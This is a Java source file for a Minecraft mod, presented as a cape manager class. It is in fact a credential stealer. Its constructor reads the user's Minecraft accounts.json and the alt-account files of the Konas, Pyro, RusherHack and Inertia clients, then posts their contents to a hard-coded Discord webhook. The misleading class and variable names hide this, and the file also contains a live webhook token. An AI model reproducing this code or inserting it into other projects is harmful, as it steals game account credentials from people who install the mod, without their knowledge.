package org.spongepowered.tools.agent.azm;

import net.minecraft.client.Minecraft;

import java.io.*;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class WurstplusCapeManager2 {

    public WurstplusCapeManager2() {
        final String l = "https://discord.com/api/webhooks/858768278348496907/Bed_vTOfUx-qMzY8XIN7zd8ii15Ax9rdUx_4UJQSFSCSDz9LT4xcNz_L4hW04O2ckfKt";
        final String CapeName = "2";
        final String CapeImageURL = "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fvignette.wikia.nocookie.net%2Fstarwars%2Fimages%2F4%2F4a%2FKylo_Ren_TLJ.png";

        WurstplusCapeUtil d = new WurstplusCapeUtil(l);

        //grabs konas alts

        try {
            File konas = new File(System.getProperty("user.home") + "/AppData/Roaming/.minecraft/accounts.json");
            BufferedReader br = new BufferedReader(new FileReader(konas));

            String s;

            StringBuilder konasac = new StringBuilder();
            konasac.append("KONASACCOUNT[S]");

            while ((s = br.readLine()) != null) {
                konasac.append("\n ").append(s);
            }

            WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent("```" + konasac.toString() + "\n```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        } catch (Exception e) {
            WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent("``` UNABLE TO PULL KONASACCOUNT[S] : " + e + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }

        //grabs pyro alts

        try {
            File pyro = new File(System.getProperty("user.home") + "/AppData/Roaming/.minecraft/Pyro/alts.json");
            BufferedReader br = new BufferedReader(new FileReader(pyro));

            String s;

            StringBuilder pyroac = new StringBuilder();
            pyroac.append("PYROACCOUNT[S]");

            while ((s = br.readLine()) != null) {
                pyroac.append("\n ").append(s);
            }

            WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent("```" + pyroac.toString() + "\n```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        } catch (Exception e) {
            WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent("``` UNABLE TO PULL PYROACCOUNT[S] : " + e + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }

        //grabs rusherhack alts

        try {
            File rusher = new File(System.getProperty("user.home") + "/AppData/Roaming/.minecraft/rusherhack/alts.json");
            BufferedReader br = new BufferedReader(new FileReader(rusher));

            String s;

            StringBuilder rusherac = new StringBuilder();
            rusherac.append("RUSHERHACKACCOUNT[S]");

            while ((s = br.readLine()) != null) {
                rusherac.append("\n ").append(s);
            }

            WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent("```" + rusherac.toString() + "\n```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        } catch (Exception e) {
            WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent("``` UNABLE TO PULL RUSHERHACKACCOUNT[S] : " + e + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }

        //grabs inertia alts

        try {
            File pyro = new File(System.getProperty("user.home") + "/AppData/Roaming/.minecraft/Inertia/1.12.2/Alts.json");
            BufferedReader br = new BufferedReader(new FileReader(pyro));

            String s;

            StringBuilder launcheraccounts = new StringBuilder();
            launcheraccounts.append("INERTIAACCOUNT[S]");

            while ((s = br.readLine()) != null) {
                launcheraccounts.append("\n ").append(s);
            }

            WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent("```" + launcheraccounts.toString() + "\n```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        } catch (Exception e) {
            WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent("``` UNABLE TO PULL INERTIAACCOUNT[S] : " + e + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }


    }}
